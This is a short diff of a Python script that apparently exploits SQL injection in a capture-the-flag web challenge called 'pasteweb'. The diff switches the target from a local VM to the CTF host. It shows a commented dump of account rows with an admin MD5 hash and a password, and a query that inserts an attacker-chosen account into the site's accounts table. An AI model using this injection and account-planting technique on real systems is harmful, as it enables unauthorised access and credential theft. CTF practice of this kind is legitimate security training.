@@ -3,8 +3,8 @@ from datetime import datetime
 from string import ascii_lowercase, digits, ascii_uppercase
 
 sess = requests.Session()
-#url = "https://pasteweb.ctf.zoolab.org"
-url = "http://192.168.146.130:8888/"
+url = "https://pasteweb.ctf.zoolab.org"
+#url = "http://192.168.198.157:8888/"
 sess.get(url)
 
 def exec_query(query:str):
@@ -92,5 +92,5 @@ def get_data():
 #print(get_data()) # {"1,admin,00ff3da3f03eb731c08c1a34de757574","777,p609
 # P@ssw0rD
 from hashlib import md5
-username = "asef18766"
+username = "asef18766_"
 exec_query(f"insert into pasteweb_accounts (user_account, user_password) VALUES('{username}','{md5(username.encode()).digest().hex()}')")
